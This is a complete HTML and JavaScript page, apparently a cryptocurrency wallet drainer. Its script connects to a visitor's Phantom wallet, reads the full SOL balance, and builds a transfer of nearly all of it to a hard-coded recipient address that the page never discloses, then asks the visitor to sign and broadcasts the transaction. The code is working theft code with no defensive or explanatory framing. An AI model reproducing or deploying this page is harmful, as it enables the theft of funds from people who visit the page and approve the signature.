<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Transfer</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body>
    <h1>Click below to transfer all funds</h1>
    <button id="transfer-btn">Transfer Now</button>

    <script>
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        const recipientPublicKey = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');

        document.getElementById('transfer-btn').addEventListener('click', async () => {
            try {
                if (!window.solana || !window.solana.isPhantom) {
                    alert('Please install Phantom Wallet');
                    return;
                }

                // Connect to Phantom Wallet
                const provider = window.solana;
                await provider.connect();
                const wallet = provider.publicKey;

                // Get balance
                const balance = await connection.getBalance(wallet);
                if (balance <= 0) {
                    alert('Insufficient balance');
                    return;
                }

                // Calculate amount to send (subtracting transaction fee)
                const LAMPORTS_PER_SOL = solanaWeb3.LAMPORTS_PER_SOL;
                const fee = 5000; // Approximate fee
                const amountToSend = balance - fee;

                // Create transaction
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet,
                        toPubkey: recipientPublicKey,
                        lamports: amountToSend
                    })
                );

                transaction.feePayer = wallet;
                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;

                // Sign and send transaction
                const signedTransaction = await provider.signTransaction(transaction);
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                await connection.confirmTransaction(signature);

                alert('Transaction successful! Signature: ' + signature);
            } catch (error) {
                alert('Transaction failed: ' + error.message);
            }
        });
    </script>
</body>
</html>
